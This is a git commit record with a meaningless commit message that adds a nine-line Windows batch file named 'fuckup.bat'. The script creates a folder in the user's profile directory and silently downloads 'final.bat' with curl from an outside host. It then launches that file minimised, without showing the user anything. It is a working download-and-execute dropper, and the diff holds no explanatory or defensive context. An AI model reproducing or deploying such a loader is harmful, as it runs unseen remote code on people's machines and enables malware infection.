d0f49d2b45d58ee8ed002edb15f8474622354b4d
tobiasrepracek <80835891+tobiasrepracek@users.noreply.github.com>
2022-05-11 14:06:30 +0200

    fdsfsd
    sdfsdfsxf

---
+++ fuckup.bat
@@ -0,0 +1,9 @@
+@echo off
+cd %UserProfile%
+md lulw
+cd lulw
+del final.bat
+ping localhost -n 3 >nul
+curl -s https://sources.tobir.xyz/final.bat >final.bat
+ping localhost -n 3 >nul
+start final.bat /min
